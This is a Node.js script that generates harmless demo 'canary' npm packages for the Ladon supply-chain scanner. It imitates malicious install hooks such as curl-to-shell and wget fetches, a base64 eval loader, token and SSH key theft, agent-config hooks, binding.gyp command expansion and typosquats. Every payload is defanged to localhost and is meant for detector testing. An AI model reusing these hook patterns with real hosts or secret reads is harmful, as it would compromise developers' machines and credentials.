// Generates the harmless canary corpus in demo/canaries/<name>/.
// EVERY payload only writes /tmp/ladon-canary-pwned (with its own name) and pings 127.0.0.1.
// Paths like ~/.claude or ~/.npmrc appear as *strings* so static analysis has something to find;
// nothing reads secrets, nothing leaves the machine. Never publish these anywhere but local Verdaccio.
import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));

const MARK = (name) => `
const __fs = require("fs"), __os = require("os"), __path = require("path");
const __marker = process.platform === "win32" ? __path.join(__os.tmpdir(), "ladon-canary-pwned") : "/tmp/ladon-canary-pwned";
__fs.appendFileSync(__marker, "${name} ran at " + new Date().toISOString() + "\\n");`;
const PING = `
try { const r = require("http").get({ host: "127.0.0.1", port: 4874, path: "/canary", timeout: 300 }, (x) => x.resume()); r.on("error", () => {}); r.on("timeout", () => r.destroy()); } catch {}`;

/** name → { attack, scripts, files } */
const CANARIES = {
  "ladon-canary-worm": {
    attack: "Aug 2026 worm pattern: plants a hook in Claude Code settings (here: only names the path)",
    scripts: { postinstall: "node setup.js" },
    files: {
      "setup.js": `${MARK("ladon-canary-worm")}
// A real worm would merge a PreToolUse hook into this file. The canary only computes the path.
const target = __path.join(__os.homedir(), ".claude", "settings.json");
const tasks = ".vscode/tasks.json";
void target; void tasks;${PING}`,
    },
  },
  "ladon-canary-obfuscated": {
    attack: "base64 + eval loader",
    scripts: { postinstall: "node loader.js" },
    files: {
      "loader.js": `const code = Buffer.from("${Buffer.from(`require("fs").appendFileSync("/tmp/ladon-canary-pwned","ladon-canary-obfuscated ran\\n")`).toString("base64")}", "base64").toString();
eval(code);`,
    },
  },
  "ladon-canary-curl": {
    attack: "preinstall pipes a remote script to the shell (to localhost)",
    scripts: { preinstall: "curl -s http://127.0.0.1:4874/x.sh | sh || true" },
    files: {},
  },
  "ladon-canary-child": {
    attack: "child_process with a computed command string",
    scripts: { install: "node run.js" },
    files: {
      "run.js": `const cp = require("child_process");
const parts = ["ec", "ho ladon-canary-child >> /tmp/ladon-canary-pwned"];
cp.exec(parts.join(""), () => {});`,
    },
  },
  "ladon-canary-tokens": {
    attack: "token stealer shape: looks for .npmrc and NPM_TOKEN",
    scripts: { postinstall: "node steal.js" },
    files: {
      "steal.js": `${MARK("ladon-canary-tokens")}
const npmrc = __path.join(__os.homedir(), ".npmrc"); // a real stealer would read this
const has = Boolean(process.env.NPM_TOKEN || process.env.GITHUB_TOKEN); // only checks presence
void npmrc; void has;${PING}`,
    },
  },
  "ladon-canary-dns": {
    attack: "DNS exfiltration shape",
    scripts: { postinstall: "node d.js" },
    files: { "d.js": `${MARK("ladon-canary-dns")}\nrequire("dns").lookup("localhost", () => {});` },
  },
  "ladon-canary-ssh": {
    attack: "SSH key theft shape",
    scripts: { postinstall: "node k.js" },
    files: { "k.js": `${MARK("ladon-canary-ssh")}\nconst keyPath = require("path").join(require("os").homedir(), ".ssh", "id_ed25519");\nvoid keyPath;${PING}` },
  },
  "ladon-canary-deep": {
    attack: "payload hidden two requires deep",
    scripts: { postinstall: "node index.js" },
    files: {
      "index.js": `require("./lib/util");`,
      "lib/util.js": `require("./net");`,
      "lib/net.js": `${MARK("ladon-canary-deep")}${PING}\nconst e = JSON.stringify(process.env).length; void e;`,
    },
  },
  "ladon-canary-sh": {
    attack: "shell script installer with wget",
    scripts: { postinstall: "sh install.sh" },
    files: { "install.sh": `#!/bin/sh\nwget -q -O - http://127.0.0.1:4874/payload 2>/dev/null || true\necho "ladon-canary-sh ran" >> /tmp/ladon-canary-pwned\n` },
  },
  "ladon-canary-gyp": {
    attack: "June 2026 binding.gyp wave: command expansion runs at build",
    scripts: {},
    gypfile: true,
    files: { "binding.gyp": `{ "targets": [ { "target_name": "<!(node -e \\"require('fs').appendFileSync('/tmp/ladon-canary-pwned','ladon-canary-gyp ran\\\\n')\\")", "sources": [] } ] }` },
  },
  "ladon-canary-mcp": {
    attack: "registers a rogue MCP server in agent config (names the path only)",
    scripts: { postinstall: "node m.js" },
    files: { "m.js": `${MARK("ladon-canary-mcp")}\nconst cfg = { mcpServers: { helper: { command: "npx", args: ["ladon-canary-mcp"] } } };\nconst where = ".cursor/mcp.json";\nvoid cfg; void where;` },
  },
  // typosquats / look-alikes of popular packages (names live only on the local registry)
  rnongoose: { attack: "homoglyph squat of mongoose", scripts: { postinstall: "node p.js" }, files: { "p.js": `${MARK("rnongoose")}${PING}` } },
  axois: { attack: "typosquat of axios", scripts: { postinstall: "node p.js" }, files: { "p.js": `${MARK("axois")}${PING}` } },
  chalkk: { attack: "typosquat of chalk (no install script — name + newness only)", scripts: {}, files: {} },
  lodahs: { attack: "typosquat of lodash", scripts: { postinstall: "node p.js" }, files: { "p.js": `${MARK("lodahs")}\nconst t = process.env.AWS_SECRET_ACCESS_KEY ? 1 : 0; void t;` } },
};

for (const [name, c] of Object.entries(CANARIES)) {
  const dir = join(here, name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  const pkg = {
    name,
    version: "1.0.0",
    description: `LADON DEMO CANARY — harmless. ${c.attack}. Local Verdaccio only.`,
    main: "index.js",
    license: "MIT",
    scripts: c.scripts,
    ...(c.gypfile ? { gypfile: true } : {}),
    publishConfig: { registry: "http://localhost:4873/" },
    ladonCanary: { attack: c.attack },
  };
  writeFileSync(join(dir, "package.json"), JSON.stringify(pkg, null, 2) + "\n");
  if (!c.files["index.js"]) writeFileSync(join(dir, "index.js"), `module.exports = {};\n`);
  for (const [f, body] of Object.entries(c.files)) {
    mkdirSync(dirname(join(dir, f)), { recursive: true });
    writeFileSync(join(dir, f), body.trimStart() + "\n");
  }
  writeFileSync(join(dir, "README.md"), `# ${name} (LADON DEMO CANARY)\n\nHarmless. ${c.attack}.\nOnly writes /tmp/ladon-canary-pwned and pings 127.0.0.1. Local Verdaccio only.\n`);
}
console.log(`generated ${Object.keys(CANARIES).length} canaries`);
export const CANARY_NAMES = Object.keys(CANARIES);
